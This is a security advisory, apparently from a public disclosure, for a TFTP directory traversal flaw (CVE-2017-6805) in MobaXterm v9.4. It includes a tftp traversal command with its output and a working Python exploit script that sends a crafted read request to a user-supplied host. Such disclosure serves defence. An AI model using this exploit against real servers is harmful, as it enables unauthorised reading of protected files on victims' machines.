@@ -1,0 +1,125 @@
+[+] Credits: John Page AKA hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MOBAXTERM-TFTP-PATH-TRAVERSAL-REMOTE-FILE-ACCESS.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+=====================
+mobaxterm.mobatek.net
+
+
+
+Product:
+===============================
+MobaXterm Personal Edition v9.4
+
+Enhanced terminal for Windows with X11 server, tabbed SSH client, network tools and much more.
+
+
+
+Vulnerability Type:
+=====================================
+Path Traversal Remote File Disclosure
+
+
+
+
+CVE Reference:
+==============
+CVE-2017-6805
+
+
+
+Security Issue:
+================
+Remote attackers can use UDP socket connection to TFTP server port 69 and send Read request, to retrieve otherwise protected files using
+directory traversal attacks e.g.  ../../../../Windows/system.ini
+
+Start MobaXterm TFTP server which listens on default TFTP port 69.
+
+c:\>tftp -i 127.0.0.1 GET ../../../../Windows/system.ini
+Transfer successful: 219 bytes in 1 second(s), 219 bytes/s
+
+c:\xampp\htdocs>type system.ini
+; for 16-bit app support
+[386Enh]
+woafont=dosapp.fon
+EGA80WOA.FON=EGA80WOA.FON
+EGA40WOA.FON=EGA40WOA.FON
+CGA80WOA.FON=CGA80WOA.FON
+CGA40WOA.FON=CGA40WOA.FON
+
+[drivers]
+wave=mmdrv.dll
+timer=timer.drv
+
+[mci]
+
+Victim Data located on: 127.0.0.1
+
+
+
+POC URL:
+=============================
+https://vimeo.com/207516364
+
+
+
+
+Exploit:
+==========
+
+import sys,socket
+
+print 'MobaXterm TFTP Directory Traversal 0day Exploit'
+print 'Read Windows/system.ini'
+print 'hyp3rlinx \n'
+
+HOST = raw_input("[IP]>")
+FILE = 'Windows/system.ini' 
+PORT = 69                                        
+ 
+PAYLOAD = "\x00\x01"                                #TFTP Read 
+PAYLOAD += "../" * 4 + FILE + "\x00"                #Read system.ini using directory traversal
+PAYLOAD += "netascii\x00"                           #TFTP Type
+ 
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.sendto(PAYLOAD, (HOST, PORT))
+out = s.recv(1024)
+s.close()
+
+print "Victim Data located on : %s " %(HOST)
+print out.strip()
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification: No Reply
+March 10, 2017  : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
